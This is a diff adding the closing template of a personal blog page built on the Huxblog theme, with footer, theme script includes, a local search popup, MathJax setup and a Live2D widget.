+        </ul>
+        
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+<!-- anchorjs start -->
+<!-- async load function -->
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script type="text/javascript">
+  // async load function
+  function async (u, c) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) {
+      o.addEventListener('load', function(e) {
+        c(null, e);
+      }, false);
+    }
+    s.parentNode.insertBefore(o, s);
+  };
+</script>
+<script type="text/javascript">
+  //anchor-js, Doc:http://bryanbraun.github.io/anchorjs/
+  async ("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js", function() {
+    anchors.options = {
+      visible: 'hover',
+      placement: 'left',
+      // icon: 'ℬ'
+      icon: '❡'
+    };
+    anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+  });
+</script>
+<style>
+  /* place left on bigger screen */
+  @media all and (min-width: 800px) {
+    .anchorjs-link {
+      position: absolute;
+      left: -0.75em;
+      font-size: 1.1em;
+      margin-top: -0.1em;
+    }
+  }
+</style>
+
+<!-- anchorjs end -->
+
+
+
+		<!-- Footer (contains ThemeColor、viewer) -->
+		<!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center">
+          
+
+          
+            <li>
+              <a target="_blank" href="https://github.com/Morouu">
+                <span class="fa-stack fa-lg">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+        </ul>
+        <p class="copyright text-muted">
+         &copy; 2021
+		 <i class="icon-smile"></i>
+          morouu
+          <br>
+          Theme by
+          <a target="_blank" rel="noopener" href="http://beantech.org">BeanTech</a>
+          <span style="display: inline-block; margin: 0 5px;">
+            <i class="fa fa-heart"></i>
+          </span>
+          re-Ported by
+          <a target="_blank" rel="noopener" href="https://v-vincen.life/">Live My Life</a>
+          |
+          <iframe style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0" width="91px" height="20px" src="https://ghbtns.com/github-btn.html?user=V-Vincen&repo=V-Vincen.github.io&type=star&count=true"></iframe>
+        <div class=" copyright text-muted live_time"><span>本博客已萌萌哒地运行</span><span id="display_live_time"> 0 天 0 小时 0 分 0 秒</span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
+  setTimeout(blog_live_time, 1000);
+  const start = new Date('2021-12-27T20:23:15');
+  const now = new Date();
+  const timeDiff = (now.getTime() - start.getTime());
+  const msPerMinute = 60 * 1000;
+  const msPerHour = 60 * msPerMinute;
+  const msPerDay = 24 * msPerHour;
+  const passDay = Math.floor(timeDiff / msPerDay);
+  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
+  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
+  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
+  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
+}
+blog_live_time();
+</script></div>
+		</p>
+		
+      </div>
+    </div>
+  </div>
+</footer>
+
+<a id="rocket" href="#top" class=""></a>
+
+
+  <!-- jQuery -->
+  <script type="text/javascript" src="/js/jquery.min.js"></script>
+  <!-- Bootstrap Core JavaScript -->
+  <script type="text/javascript" src="/js/bootstrap.min.js"></script>
+  <!-- Custom Theme JavaScript -->
+  <script type="text/javascript" src="/js/hux-blog.min.js"></script>
+  <!-- catalog -->
+  <script async="true" type="text/javascript" src="/js/catalog.js"></script>
+  <!-- totop(rocket) -->
+  <script async="true" type="text/javascript" src="/js/totop.js"></script>
+
+  
+    <!-- Busuanzi JavaScript -->
+    <script async="async" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <!-- Scroll start -->
+    <script async="async" type="text/javascript" src="/js/scroll.js"></script>
+    <!-- Scroll end -->
+  
+
+  
+    <!-- LangSelect start -->
+    <script type="text/javascript" src="/js/langselect.js"></script>
+    <!-- LangSelect end -->
+  
+
+  
+    <!-- Mouseclick -->
+    <script type="text/javascript" src="/js/mouseclick.js" content='' color=''></script>
+  
+
+  
+    <!-- ribbon -->
+    <script type="text/javascript" src="/js/ribbonDynamic.js"></script>
+  
+
+  
+    <!-- Line start -->
+    <script async="text/javascript" src="/js/line.js"></script>
+    <!-- Line end -->
+  
+
+
+
+
+
+
+  <!-- viewer start -->
+  <!-- viewer start (Picture preview) -->
+  
+    <script async="async" type="text/javascript" src="/js/viewer/viewer.min.js"></script>
+    <script async="async" type="text/javascript" src="/js/viewer/pic-viewer.js"></script>
+  
+
+  <!-- viewer end -->
+
+
+<script>
+  // async load function
+  function async (u, c) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) {
+      o.addEventListener('load', function (e) {
+        c(null, e);
+      }, false);
+    }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  // fastClick.js
+  async ("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function () {
+    var $nav = document.querySelector("nav");
+    if ($nav)
+      FastClick.attach($nav);
+    }
+  )
+</script>
+
+<!-- Because of the native support for backtick-style fenced code blocks right within the Markdown is landed in Github Pages, From V1.6, There is no need for Highlight.js, so Huxblog drops it officially. -
+https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0 - https://help.github.com/articles/creating-and-highlighting-code-blocks/ -->
+<!-- <script> async ("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function () { hljs.initHighlightingOnLoad(); }) </script> <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet"> -->
+
+<!-- jquery.tagcloud.js -->
+<!-- <script> // only load tagcloud.js in tag.html if ($('#tag_cloud').length !== 0) { async ("https://morblog.cc/js/jquery.tagcloud.js", function () { $.fn.tagcloud.defaults = { // size: { start: 1, end: 1, unit: 'em' }, color: {
+start: '#bbbbee', end: '#0085a1' } }; $('#tag_cloud a').tagcloud(); }) } </script> -->
+
+
+		<!-- Search -->
+		
+		<div class="popup search-popup local-search-popup">
+  <span class="popup-btn-close">
+    ESC
+  </span>
+  <div class="container">
+    <div class="row">
+      <!-- <div class="col-md-9 col-md-offset-1"> -->
+      <div class="col-lg-9 col-lg-offset-1 col-md-10 col-md-offset-1 local-search-content">
+
+        <div class="local-search-header clearfix">
+
+          <div class="local-search-input-wrapper">
+            <span class="search-icon">
+              <i class="fa fa-search fa-lg" style="margin: 25px 10px 25px 20px;"></i>
+            </span>
+            <input autocomplete="off" placeholder="搜索..." type="text" id="local-search-input">
+          </div>
+        </div>
+        <div id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+  
+    <script src="/js/ziploader.js"></script>
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.json";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    // monitor main search box;
+    var onPopupClose = function (e) {
+      $('.popup').fadeOut(300);
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $('.popup').fadeIn(300);
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+    // get search zip version
+    $.get('/searchVersion.json?t=' + (+new Date()), function (res) {
+      if (localStorage.getItem('searchVersion') !== res) {
+        localStorage.setItem('searchVersion', res);
+        initSearchJson();
+      }
+    });
+
+    function initSearchJson() {
+      initLoad(['/search.flv'], {
+        loadOptions: {
+          success: function (obj) {
+            localStorage.setItem('searchJson', obj['search.json'])
+          },
+          error: function (e) {
+            return console.log(e)
+          }
+        },
+        returnOptions: {
+          'json': TYPE_TEXT
+        },
+        mimeOptions: {
+          'json': 'application/json'
+        }
+      })
+    }
+    // search function;
+    var searchFunc = function (search_id, content_id) {
+      'use strict';
+      isfetched = true;
+      var datas = JSON.parse(localStorage.getItem('searchJson'));
+      // console.log(search_id)
+      var input = document.getElementById(search_id);
+      var resultContent = document.getElementById(content_id);
+      var inputEventFunction = function () {
+        var searchText = input.value.trim().toLowerCase();
+        var keywords = searchText.split(/[\s\-]+/);
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        var resultItems = [];
+        if (searchText.length > 0) {
+          // perform local searching
+          datas.forEach(function (data) {
+            var isMatch = false;
+            var hitCount = 0;
+            var searchTextCount = 0;
+            var title = data.title
+              ? data.title.trim()
+              : '';
+            var titleInLowerCase = title.toLowerCase();
+            var content = data.content
+              ? data.content.trim().replace(/<[^>]+>/g, "")
+              : '';
+            var contentInLowerCase = content.toLowerCase();
+            var articleUrl = decodeURIComponent(data.url);
+
+            var date = data.date;
+            var dateTime = date.replace(/T/, " ").replace(/.000Z/, "");
+            var imgUrl = data.header_img;
+            
+
+
+            var indexOfTitle = [];
+            var indexOfContent = [];
+            // only match articles with not empty titles
+            keywords.forEach(function (keyword) {
+              function getIndexByWord(word, text, caseSensitive) {
+                var wordLen = word.length;
+                if (wordLen === 0) {
+                  return [];
+                }
+                var startPosition = 0,
+                  position = [],
+                  index = [];
+                if (!caseSensitive) {
+                  text = text.toLowerCase();
+                  word = word.toLowerCase();
+                }
+                while ((position = text.indexOf(word, startPosition)) > -1) {
+                  index.push({position: position, word: word});
+                  startPosition = position + wordLen;
+                }
+                return index;
+              }
+              indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+              indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+            });
+            if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+              isMatch = true;
+              hitCount = indexOfTitle.length + indexOfContent.length;
+            }
+            // show search results
+            if (isMatch) {
+              // sort index by position of keyword
+              [indexOfTitle, indexOfContent].forEach(function (index) {
+                index.sort(function (itemLeft, itemRight) {
+                  if (itemRight.position !== itemLeft.position) {
+                    return itemRight.position - itemLeft.position;
+                  } else {
+                    return itemLeft.word.length - itemRight.word.length;
+                  }
+                });
+              });
+              // merge hits into slices
+              function mergeIntoSlice(text, start, end, index) {
+                var item = index[index.length - 1];
+                var position = item.position;
+                var word = item.word;
+                var hits = [];
+                var searchTextCountInSlice = 0;
+                while (position + word.length <= end && index.length != 0) {
+                  if (word === searchText) {
+                    searchTextCountInSlice++;
+                  }
+                  hits.push({position: position, length: word.length});
+                  var wordEnd = position + word.length;
+                  // move to next position of hit
+                  index.pop();
+                  while (index.length != 0) {
+                    item = index[index.length - 1];
+                    position = item.position;
+                    word = item.word;
+                    if (wordEnd > position) {
+                      index.pop();
+                    } else {
+                      break;
+                    }
+                  }
+                }
+                searchTextCount += searchTextCountInSlice;
+                return {hits: hits, start: start, end: end, searchTextCount: searchTextCountInSlice};
+              }
+              var slicesOfTitle = [];
+              if (indexOfTitle.length != 0) {
+                slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+              }
+              var slicesOfContent = [];
+              while (indexOfContent.length != 0) {
+                var item = indexOfContent[indexOfContent.length - 1];
+                var position = item.position;
+                var word = item.word;
+                // cut out 100 characters
+                var start = position - 20;
+                var end = position + 80;
+                if (start < 0) {
+                  start = 0;
+                }
+                if (end < position + word.length) {
+                  end = position + word.length;
+                }
+                if (end > content.length) {
+                  end = content.length;
+                }
+                slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+              }
+              // sort slices in content by search text's count and hits' count
+              slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                  return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                  return sliceRight.hits.length - sliceLeft.hits.length;
+                } else {
+                  return sliceLeft.start - sliceRight.start;
+                }
+              });
+              // select top N slices in content
+              var upperBound = parseInt('1');
+              if (upperBound >= 0) {
+                slicesOfContent = slicesOfContent.slice(0, upperBound);
+              }
+              // highlight title and content
+              function highlightKeyword(text, slice) {
+                var result = '';
+                var prevEnd = slice.start;
+                slice.hits.forEach(function (hit) {
+                  result += text.substring(prevEnd, hit.position);
+                  var end = hit.position + hit.length;
+                  result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                  prevEnd = end;
+                });
+                result += text.substring(prevEnd, slice.end);
+                return result;
+              }
+              var resultItem = '';
+
+              // if (slicesOfTitle.length != 0) {   resultItem += "<li><a target='_blank' href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>"; } else {   resultItem += "<li><a target='_blank' href='" +
+              // articleUrl + "' class='search-result-title'>" + title + "</a>"; } slicesOfContent.forEach(function (slice) {   resultItem += "<a target='_blank' href='" + articleUrl + "'><p class=\"search-result\">" + highlightKeyword(content, slice) +
+              // "...</p></a>"; }); resultItem += "</li>";
+
+              if (slicesOfTitle.length != 0) {
+                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</div><time class='search-result-date'>" + dateTime + "</time>";
+              } else {
+                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + title + "</div><time class='search-result-date'>" + dateTime + "</time>";
+              }
+              slicesOfContent.forEach(function (slice) {
+                resultItem += "<p class=\"search-result-content\">" + highlightKeyword(content, slice) + "...</p>";
+              });
+              resultItem += "</div><div class='search-result-right'><img class='media-image' src='" + imgUrl + "' width='64px' height='48px'></img></div></a>";
+
+              resultItems.push({item: resultItem, searchTextCount: searchTextCount, hitCount: hitCount, id: resultItems.length});
+            }
+          })
+        };
+
+        if (keywords.length === 1 && keywords[0] === "") {
+          resultContent.innerHTML = '<div id="no-result"></div>'
+        } else if (resultItems.length === 0) {
+          resultContent.innerHTML = '<div id="no-result"></div>'
+        } else {
+          resultItems.sort(function (resultLeft, resultRight) {
+            if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+              return resultRight.searchTextCount - resultLeft.searchTextCount;
+            } else if (resultLeft.hitCount !== resultRight.hitCount) {
+              return resultRight.hitCount - resultLeft.hitCount;
+            } else {
+              return resultRight.id - resultLeft.id;
+            }
+          });
+          var searchResultList = '<div class=\"search-result-list\">';
+          resultItems.forEach(function (result) {
+            searchResultList += result.item;
+          })
+          searchResultList += "</div>";
+          resultContent.innerHTML = searchResultList;
+        }
+      }
+      if ('auto' === 'auto') {
+        input.addEventListener('input', inputEventFunction);
+      } else {
+        $('.search-icon').click(inputEventFunction);
+        input.addEventListener('keypress', function (event) {
+          if (event.keyCode === 13) {
+            inputEventFunction();
+          }
+        });
+      }
+      // remove loading animation
+      $('body').css('overflow', '');
+      proceedsearch();
+    }
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function (e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc('local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function (e) {
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 && $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+
+    document.addEventListener('mouseup', (e) => {
+      var _con = document.querySelector(".local-search-content");
+      if (_con) {
+        if (!_con.contains(e.target)) {
+          onPopupClose();
+        }
+      }
+    });
+  </script>
+
+
+		
+	<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-haru/02"},"display":{"position":"right","width":225,"height":225,"right":125},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
